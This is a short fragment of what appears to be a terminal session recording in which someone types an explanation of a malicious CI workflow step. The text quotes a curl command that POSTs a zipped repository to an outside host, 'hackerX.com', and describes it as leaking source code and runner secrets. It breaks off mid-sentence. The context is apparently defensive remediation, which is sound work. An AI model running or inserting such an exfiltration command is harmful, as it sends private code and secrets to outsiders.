[99.176045, "o", "\u001b[?2004l\r\u001b[?2004h> "]
[99.176366, "o", "curl -X POST -F \"file=@repo.zip\" https://hackerX.com/upload\r\n\u001b[?2004l\r\u001b[?2004h> ```\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> This archived the **entire repository** and POSTed it to an external, non-GitHub domain\r\n\u001b[?2004l\r\u001b[?2004h> (`hackerX.com`), which could leak source code and any secrets available in the runner\r\n\u001b[?2004l\r\u001b[?2004h> environment. The step (along with the preceding \"Archive entire repo\" step) has been\r\n\u001b[?2004l\r\u001b[?2004h> "]
